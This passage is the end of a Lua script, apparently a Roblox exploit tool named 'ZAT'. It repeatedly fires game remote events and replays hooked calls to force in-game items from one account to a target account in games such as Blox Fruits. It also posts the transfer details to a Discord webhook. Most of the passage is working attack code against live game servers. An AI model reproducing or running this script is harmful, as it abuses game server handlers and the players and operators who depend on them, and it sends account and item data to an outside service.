            fire(entry,{
                {tid},{tostring(tid)},{tn},
                {{userId=tid}},{{username=tn}},{{to=tid}},
                tp and {tp} or nil,
            })
            firedCount=firedCount+1
            statVals.fired.Text=tostring(firedCount)
            task.wait(0.005)
        end

        -- Phase C: learned replay
        if hookOn then
            local lr=replayLearned(tid,tn,tp,items)
            if lr>0 then log("Learned replay: "..lr,"ok") end
        end

        -- refresh tp
        tp=PLR:GetPlayerByUserId(tid)
        if tp then log("Target online — adding Player object","ok") end

        log("Loop "..loop.." done | fired: "..firedCount,"ok")
        if loop<LOOPS then task.wait(2) end
    end

    stopHook()

    -- Queue for when Account 2 joins
    table.insert(queue,{tid=tid,tn=tn,items=items,prof=prof})
    log("Queue armed — fires when "..tn.." joins this server","ok")

    -- Discord
    if DISCORD_WEBHOOK~="" then
        task.spawn(function()
            local ip={}
            for _,it in ipairs(items) do table.insert(ip,it.name) end
            fetch(DISCORD_WEBHOOK,"POST",{["Content-Type"]="application/json"},je({
                username="ZAT Focused",
                embeds={{title="📦 ZAT Transfer",color=transferredCount>0 and 3066993 or 15844367,
                    fields={
                        {name="👤 Sender",value=LP.Name.." ("..LP.UserId..")",inline=true},
                        {name="🎯 Target",value=tn.." ("..tid..")",inline=true},
                        {name="🎮 Game",  value=gameName.." ["..gameKey.."]",inline=false},
                        {name="🎒 Items", value=table.concat(ip,", "),inline=false},
                        {name="📊 Stats", value="Fired: "..firedCount.." | Confirmed moved: "..transferredCount,inline=false},
                    },footer={text="ZAT • "..os.date("!%Y-%m-%d %H:%M UTC")},
                }},
            }))
        end)
    end

    setProg(1)
    if transferredCount>0 then
        setDot(C.green)
        log("DONE — "..transferredCount.." item(s) confirmed transferred","done")
        log("Log into Account 2 and join this game","info")
    else
        setDot(C.yellow)
        log("Firing complete — "..firedCount.." fires sent","done")
        log("Check Account 2 inventory after joining game","info")
        log("If empty here = server accepted transfer","info")
        log("If not: game may need Account 2 online","warn")
        log("→ Keep script running, join on Account 2 same server","warn")
    end

    running=false
    BTN.Text="▶  START TRANSFER"; BTN.BackgroundColor3=C.accent
end

BTN.MouseButton1Click:Connect(function()
    if running then
        running=false; stopHook()
        BTN.Text="▶  START TRANSFER"; BTN.BackgroundColor3=C.accent
        setDot(C.grey); log("Stopped","warn")
    else
        task.spawn(runTransfer)
    end
end)

-- init
local _,_,gn=detectGame()
GAMETEXT.Text="🎮  "..gn.." (detected)"
log("ZAT loaded","ok")
log("Target: "..TARGET_USERNAME,"info")
log("Supports: GAG · GAG2 · Blox Fruits","info")
log("Press START when in-game with items","info")
